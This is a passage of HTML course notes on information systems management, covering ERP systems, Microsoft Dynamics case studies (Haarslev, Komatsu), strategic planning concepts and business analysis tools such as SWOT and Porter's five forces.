&lt;li&gt;Integration all areas of a company&lt;/li&gt;
&lt;li&gt;Microsoft dynamics and vision&lt;/li&gt;
&lt;li&gt;data accuracy and consistency&lt;/li&gt;
&lt;li&gt;decision-making&lt;/li&gt;
&lt;li&gt;improved collaboration&lt;/li&gt;
&lt;li&gt;customer satisfaction&lt;/li&gt;
&lt;li&gt;Data accuracy and consistency: no separate systems, reduces risk of errors&lt;/li&gt;
&lt;li&gt;Better decision-making: realt-time&lt;/li&gt;
&lt;li&gt;Improved collaboration: across different departments and locations&lt;/li&gt;
&lt;li&gt;Increased customer satisfaction: better manage customer orders, inventory, and deliveries&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Supply chain management system (SCM)&lt;/li&gt;
&lt;li&gt;Customer relationship management systems (CRM)&lt;/li&gt;
&lt;li&gt;Knowledge management systems (KMS)
&lt;ul&gt;
&lt;li&gt;Confluence&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;haarslev-industry&#34; &gt;Haarslev Industry
&lt;span&gt;
    &lt;a href=&#34;#haarslev-industry&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Problem
&lt;ul&gt;
&lt;li&gt;business process integrations of acquired companies&lt;/li&gt;
&lt;li&gt;global expansion&lt;/li&gt;
&lt;li&gt;lack of consolidation of operations&lt;/li&gt;
&lt;li&gt;Many ERP systems&lt;/li&gt;
&lt;li&gt;Process driven operations
&lt;ul&gt;
&lt;li&gt;no streamlined system to allow this&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Microsoft Dynamics
&lt;ul&gt;
&lt;li&gt;Global integration&lt;/li&gt;
&lt;li&gt;Unified business processes&lt;/li&gt;
&lt;li&gt;Enhanced process efficiency&lt;/li&gt;
&lt;li&gt;Adoption of best practices (RapidValue)&lt;/li&gt;
&lt;li&gt;Data Management&lt;/li&gt;
&lt;li&gt;Documentation and Customization&lt;/li&gt;
&lt;li&gt;Key components
&lt;ul&gt;
&lt;li&gt;Finance&lt;/li&gt;
&lt;li&gt;Supply chain management&lt;/li&gt;
&lt;li&gt;Sales&lt;/li&gt;
&lt;li&gt;Customer Service&lt;/li&gt;
&lt;li&gt;Marketing&lt;/li&gt;
&lt;li&gt;Field Service&lt;/li&gt;
&lt;li&gt;Business Central&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;to-increase-microsoft-dynamics&#34; &gt;To-Increase [&amp;hellip;Microsoft Dynamics]
&lt;span&gt;
    &lt;a href=&#34;#to-increase-microsoft-dynamics&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Database management system (DBMS)&lt;/li&gt;
&lt;li&gt;Cloud computing: scalability&lt;/li&gt;
&lt;li&gt;data analytics: insights and reports&lt;/li&gt;
&lt;li&gt;artificial intelligence: forecasting, automation, decision-making enhancements&lt;/li&gt;
&lt;li&gt;Internet of things: collect real-time data&lt;/li&gt;
&lt;li&gt;APIs: integration with other systems and services&lt;/li&gt;
&lt;li&gt;Mobile: accessibility&lt;/li&gt;
&lt;li&gt;Security&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;information-systems-strategic-planning&#34; &gt;Information Systems Strategic Planning
&lt;span&gt;
    &lt;a href=&#34;#information-systems-strategic-planning&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;creating-video-games&#34; &gt;Creating Video Games
&lt;span&gt;
    &lt;a href=&#34;#creating-video-games&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Strategic planning is a process that involves defining an organization&amp;rsquo;s direction and making decisions on allocating its resources to pursue this direction&lt;/li&gt;
&lt;li&gt;It involves setting goals, analyzing the competitive environment, creating a plan for achieving long-term success, putting it into action, and continually evaluating your process and its outcomes&lt;/li&gt;
&lt;li&gt;Tim Hortons, quick coffee delivery and walk-through&lt;/li&gt;
&lt;li&gt;McDonalds fully automated store&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;customer-intimacy&#34; &gt;Customer Intimacy
&lt;span&gt;
    &lt;a href=&#34;#customer-intimacy&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;know your customers really well&lt;/li&gt;
&lt;li&gt;understanding customers&amp;rsquo; needs, wants, preferences, and behaviours to anticipate before being asked&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;operational-excellence&#34; &gt;Operational Excellence
&lt;span&gt;
    &lt;a href=&#34;#operational-excellence&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;market is the total expenditure spent on a product or service&lt;/li&gt;
&lt;li&gt;Strategic planning for operational excellence involves formulating and implementing a plan that aligns all operational activities with the organization&amp;rsquo;s strategic objectives&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;competitive-advantage&#34; &gt;Competitive Advantage
&lt;span&gt;
    &lt;a href=&#34;#competitive-advantage&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;unique strengths or capabilities&lt;/li&gt;
&lt;li&gt;Strategic planning for competitive advantage refers to determining how your
organization can best leverage its strengths and capabilities to gain the upper
hand over its competitors&lt;/li&gt;
&lt;li&gt;goal is sustainable&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;stand-out-firms&#34; &gt;Stand-Out Firms
&lt;span&gt;
    &lt;a href=&#34;#stand-out-firms&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Stand-out form
&lt;ul&gt;
&lt;li&gt;Firms that do better are said to have a competitive advantage&lt;/li&gt;
&lt;li&gt;Access to unique resource or they can use commonly available resource more efficiently&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;strategic-planning-challenges&#34; &gt;Strategic Planning Challenges
&lt;span&gt;
    &lt;a href=&#34;#strategic-planning-challenges&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Technology comes outdated&lt;/li&gt;
&lt;li&gt;technology initiatives align with their overall strategic objectives&lt;/li&gt;
&lt;li&gt;agility and adaptable is required&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;limitations-of-traditional-strategy-making&#34; &gt;Limitations of Traditional Strategy-Making
&lt;span&gt;
    &lt;a href=&#34;#limitations-of-traditional-strategy-making&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;rigid long-term planning based on predictable trends (infeasible)&lt;/li&gt;
&lt;li&gt;rapid tech changes and shifts in consumer behaviour make trends less predictable&lt;/li&gt;
&lt;li&gt;failing to plan effectively potentially disrupts business operations or missed opportunities&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;moores-law&#34; &gt;Moore&amp;rsquo;s Law
&lt;span&gt;
    &lt;a href=&#34;#moores-law&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;transistors / microprocessor power / computing power doubles every 18 months&lt;/li&gt;
&lt;li&gt;price of computing havens every 18 months&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sense-and-respond&#34; &gt;Sense and Respond
&lt;span&gt;
    &lt;a href=&#34;#sense-and-respond&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;The &amp;ldquo;sense-and-respond&amp;rdquo; approach is a strategic approach that emphasizes agility, adaptability,
and responsiveness to rapidly changing market conditions. Unlike traditional long-term planning,
which relies on rigid strategies, the sense-and-respond approach focuses on continuous
monitoring, sensing environmental changes, and quickly responding to them.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;It emphasizes the importance of strategizing in areas where the action is most intense and speedy
such as customer interactions and feedback, frontline operations, and market changes.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;In the sense-and-respond approach, organizations actively gather data and information from
various sources, which allows them to sense market trends, customer needs, and emerging
opportunities or threats.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Microsoft and Sun/Java.&lt;/p&gt;
&lt;h3 id=&#34;ibm-in-a-service-oriented-architecture&#34; &gt;IBM in a Service-Oriented Architecture
&lt;span&gt;
    &lt;a href=&#34;#ibm-in-a-service-oriented-architecture&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;flexibility to innovate and adapt processes as per business requirements, using a service-oriented architecture.
&lt;ul&gt;
&lt;li&gt;easy modification and reuse of system components&lt;/li&gt;
&lt;li&gt;execution of changes to business rules and workflow redirection without extensive IT involvement&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;real-time tracking and measurement of process effectiveness, customizable, real-time alerts&lt;/li&gt;
&lt;li&gt;process efficiencies&lt;/li&gt;
&lt;li&gt;tracks key performance indicators (KPIs)&lt;/li&gt;
&lt;li&gt;Aligning Processes with Planning - modelling and managing processes (e.g. customer service)&lt;/li&gt;
&lt;li&gt;Strategic Decision Making - evidence-based approach (monitoring and analytics)&lt;/li&gt;
&lt;li&gt;Operational Efficiency - identification of issues or gaps in processes (bottlenecks, redundancies, inefficiencies)&lt;/li&gt;
&lt;li&gt;Agility and Change Management&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;komatsu&#34; &gt;Komatsu
&lt;span&gt;
    &lt;a href=&#34;#komatsu&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;52,000 invoices needed to be processed from suppliers MANUALLY&lt;/li&gt;
&lt;li&gt;Microsoft Power automate and AI builder automated workflow
&lt;ul&gt;
&lt;li&gt;Document processing AI model&lt;/li&gt;
&lt;li&gt;three weeks&lt;/li&gt;
&lt;li&gt;Automating for one supplier resulted in processing 1,100 invoices in three weeks; 300 hours saved&lt;/li&gt;
&lt;li&gt;blueprint for other suppliers&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Citizen Developer Program
&lt;ul&gt;
&lt;li&gt;empower employees to build business solutions&lt;/li&gt;
&lt;li&gt;aim to increase innovation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Future plans
&lt;ul&gt;
&lt;li&gt;encouraging others to adopt similar solutions&lt;/li&gt;
&lt;li&gt;enabling employees to focus on more critical tasks.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tools-for-business-analysis&#34; &gt;Tools for Business Analysis
&lt;span&gt;
    &lt;a href=&#34;#tools-for-business-analysis&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Brainstorming, SWOT (Strengths, Weaknesses, Opportunities, Threats),  Porter&amp;rsquo;s Competitive Forces Model, COPE analysis, PEST analysis (Political, Economic, Social, and Technological), STEER analysis (socio-cultural, technological, economic, ecological, regulatory), EPISTLE (environment, political, infomatic, social, technological, economic, legal)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;swot-analysis&#34; &gt;SWOT Analysis
&lt;span&gt;
    &lt;a href=&#34;#swot-analysis&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Objectives of the business&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;porters-five-force&#34; &gt;Porter&amp;rsquo;s five force
&lt;span&gt;
    &lt;a href=&#34;#porters-five-force&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;{ threat of new entrants, threat of substitutes, supplier power, buyer power, competitive rivalry }&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;vc-benchmarking&#34; &gt;VC Benchmarking
&lt;span&gt;
    &lt;a href=&#34;#vc-benchmarking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Compare VC or investments to industry benchmarks or standards&lt;/li&gt;
&lt;li&gt;financial returns, investment strategy, portfolio composition, deal flow, and fund performance&lt;/li&gt;
&lt;li&gt;evaluate success and effectiveness of VC firms in generating returns and to identify opportunities for improvement or best practices&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;management-issues-in-information-systems-development&#34; &gt;Management Issues in Information Systems Development
&lt;span&gt;
    &lt;a href=&#34;#management-issues-in-information-systems-development&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;How does an org ensure that its IT resources support its business plan&lt;/li&gt;
&lt;li&gt;How does a systems project get authorized
&lt;ul&gt;
&lt;li&gt;stakeholders&lt;/li&gt;
&lt;li&gt;project charter (objectives, scope, stakeholders, milestones, budget, and other key details)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to ensure compatibility and interoperability across different system development efforts&lt;/li&gt;
&lt;li&gt;How is a project controlled and reviewed&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;systems-development&#34; &gt;Systems Development
&lt;span&gt;
    &lt;a href=&#34;#systems-development&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;strategic alignment, effective communication, resource allocation, performance metrics, risk management&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;baseline-it-plan&#34; &gt;Baseline IT Plan
&lt;span&gt;
    &lt;a href=&#34;#baseline-it-plan&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Based upon businesses multiyear strategic plan&lt;/li&gt;
&lt;li&gt;Major IT initiatives&lt;/li&gt;
&lt;li&gt;IT requirements&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;steering-committee&#34; &gt;Steering Committee
&lt;span&gt;
